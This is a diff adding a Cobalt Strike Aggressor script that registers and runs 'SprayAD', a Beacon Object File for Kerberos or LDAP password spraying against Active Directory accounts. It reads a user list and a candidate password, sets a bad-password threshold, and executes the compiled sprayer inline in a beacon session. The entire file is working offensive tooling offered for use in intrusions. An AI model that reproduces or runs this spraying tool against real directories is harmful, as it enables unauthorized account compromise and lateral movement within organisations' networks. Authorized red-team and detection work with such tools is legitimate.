@@ -1,0 +1,64 @@
+#SprayAD Bof
+#author Cornelis de Plaa
+#@outflank.nl
+#modified by Hagrid29
+
+#register help
+beacon_command_register("SprayAD", "Perform a Kerberos or ldap password spraying attack against Active Directory.",
+	"Test a list of enabled Active Directory user accounts for valid passwords.\n\n" .
+	"Synopsis: SprayAD --userlist [file] --password [password] --authservice [ldap <optional>] --MaxBadPwdCount [number <optional>]\n\n");
+
+alias SprayAD {
+    $bid = $1;
+
+    $input = substr($0, 8);
+    @args = split(' ', $input);
+
+    local('$barch $handle $file $object $authservice $MaxBadPwdCount');
+
+    $MaxBadPwdCount = 999;
+    for($i = 0; $i < size(@args); $i++){
+        if(@args[$i] iswm "--userlist"){
+	    $i = $i + 1;
+            $file = @args[$i];
+        }
+        if(@args[$i] iswm "--password"){
+	    $i = $i + 1;
+            $object = @args[$i];
+        }
+        if(@args[$i] iswm "--authservice"){
+	    $i = $i + 1;
+            $authservice = @args[$i];
+        }
+        if(@args[$i] iswm "--MaxBadPwdCount"){
+	    $i = $i + 1;
+            $MaxBadPwdCount = @args[$i] + 1;
+        }
+    }
+
+    if ($object eq "") {
+        berror($bid, "Please specify a password to test.");
+        return;
+    }
+    
+    if ($file eq "") {
+        berror($bid, "Please specify user list to test.");
+        return;
+    }
+
+    # Read in the right BOF file
+    $barch  = barch($1);
+    $handle = openf(script_resource("SprayAD. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    $fileHandle = openf($file);
+    $userlistLength   = lof($file);
+    $userlistdata   = readb($fileHandle, -1);
+    closef($fileHandle);
+
+    $arg_data  = bof_pack($bid, "ZibZZ", $object, $userlistLength, $userlistdata, $authservice, $MaxBadPwdCount);
+    blog($bid, "Let's start spraying user accounts with password: " . $object);
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+
+}
